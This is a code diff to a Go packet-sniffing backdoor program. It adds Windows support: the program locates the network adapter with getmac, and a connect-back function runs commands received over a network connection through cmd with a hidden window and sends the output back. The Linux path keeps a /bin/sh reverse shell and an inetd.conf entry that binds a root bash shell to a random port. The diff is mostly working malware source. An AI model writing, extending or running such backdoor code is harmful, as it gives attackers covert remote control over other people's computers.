@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"errors"
 	"fmt"
 	"log"
@@ -8,7 +9,10 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
+	"strings"
+	"syscall"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -37,6 +41,9 @@ const (
 )
 
 func main() {
+	if runtime.GOOS == "windows" {
+		targetInterface = GetWinAdapter()
+	}
 	// Read package and analze them
 	handle, err := pcap.OpenLive(targetInterface, snaplen, true, pcap.BlockForever)
 	errorPrinter(err)
@@ -47,6 +54,21 @@ func main() {
 		// Your analysis here! Get the important stuff
 		printPacketInfo(pkt)
 	}
+}
+
+func GetWinAdapter() string {
+	var iface string
+	output, err := exec.Command("cmd.exe", "/c", "getmac /fo csv /v | findstr Ethernet").Output() //getting ethernet description for pcap
+	if err != nil {
+		log.Panicln(err)
+	}
+	startIndex := strings.Index(string(output), "_{")
+	finalIndex := strings.Index(string(output), "}")
+
+	temp := string(output)[startIndex+2 : finalIndex]
+	iface = "\\Device\\NPF_{" + temp + "}"
+
+	return iface
 }
 
 func errorPrinter(err error) {
@@ -114,27 +136,45 @@ func connectBack(ip string) {
 		return
 	}
 
-	cmd := exec.Command("/bin/sh")
-	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
-	cmd.Run()
-	conn.Close()
+	if runtime.GOOS == "windows" {
+		r := bufio.NewReader(conn)
+		for {
+			order, err := r.ReadString('\n')
+			if nil != err {
+				conn.Close()
+				return
+			}
+
+			cmd := exec.Command("cmd", "/C", order)
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			out, _ := cmd.CombinedOutput()
+
+			conn.Write(out)
+		}
+	} else {
+		cmd := exec.Command("/bin/sh")
+		cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
+		cmd.Run()
+		conn.Close()
+	}
+
 }
 
 func vishnu(ip string) {
-	if connectback {
+	if connectback || runtime.GOOS == "windows" {
 		connectBack(ip)
+	} else {
+		randomPort := rand.Intn(65535-100) + 100
+		// println("The doors are open on port ", strconv.Itoa(randomPort))
+		// Append to a file /etc/inetd.conf
+		fd, err := os.OpenFile("/etc/inetd.conf", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+		errorPrinter(err)
+		defer fd.Close()
+
+		if _, err = fd.WriteString(strconv.Itoa(randomPort) + " stream tcp nowait root /bin/bash bash\n"); err != nil {
+			log.Panicln(err)
+		}
+
+		exec.Command("/usr/sbin/inetd").Run()
 	}
-	randomPort := rand.Intn(65535-100) + 100
-	// println("The doors are open on port ", strconv.Itoa(randomPort))
-	// Append to a file /etc/inetd.conf
-	fd, err := os.OpenFile("/etc/inetd.conf", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
-	errorPrinter(err)
-	defer fd.Close()
-
-	if _, err = fd.WriteString(strconv.Itoa(randomPort) + " stream tcp nowait root /bin/bash bash\n"); err != nil {
-		log.Panicln(err)
-	}
-
-	exec.Command("/usr/sbin/inetd").Run()
-
 }
